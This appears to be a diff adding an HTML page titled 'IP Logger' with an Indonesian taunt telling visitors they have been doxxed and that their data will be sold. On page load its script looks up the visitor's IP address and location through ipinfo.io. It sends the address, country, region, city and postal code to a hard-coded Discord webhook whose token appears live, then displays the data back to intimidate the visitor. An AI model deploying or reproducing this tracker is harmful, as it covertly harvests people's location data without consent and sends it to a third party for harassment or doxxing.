@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+        .loading {
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Yahaha Kena Doxxing 👻</h1>
+        <p>Data mu bakal dijual di darkweb</p>
+        <p class="loading">Fetching your information...</p>
+    </div>
+
+    <script>
+        function sendToWebhook(json) {
+            const webhookURL = "https://discord.com/api/webhooks/1315696273185181716/AA2fb08xuDbNEZ0mMT4Wb4dJp1S9zG7OgA3RKa5SYFVkDUAzH5gTszbOzQZ0HHwWYSE4"; // Replace with your webhook URL
+
+            const request = new XMLHttpRequest();
+            request.open("POST", webhookURL);
+            request.setRequestHeader('Content-type', 'application/json');
+
+            const params = {
+                username: "IP Logger",
+                avatar_url: "",
+                content: "@everyone",
+                embeds: [
+                    {
+                        title: "Someone visited the IP logger!",
+                        color: 1752220,
+                        description: `**IP:** \`${json.ip}\`\n**Country:** \`${json.country}\`\n**Region:** \`${json.region}\`\n**City:** \`${json.city}\`\n**ZIP:** \`${json.postal}\``
+                    }
+                ]
+            };
+
+            request.send(JSON.stringify(params));
+        }
+
+        function updateUI(json) {
+            const loadingElement = document.querySelector('.loading');
+            loadingElement.textContent = `Your IP: ${json.ip}\nLocation: ${json.city}, ${json.region}, ${json.country}`;
+        }
+
+        function handleResponse(json) {
+            sendToWebhook(json);
+            updateUI(json);
+        }
+
+        const script = document.createElement('script');
+        script.src = "https://ipinfo.io/?format=jsonp&callback=handleResponse";
+        document.body.appendChild(script);
+    </script>
+</body>
+</html>
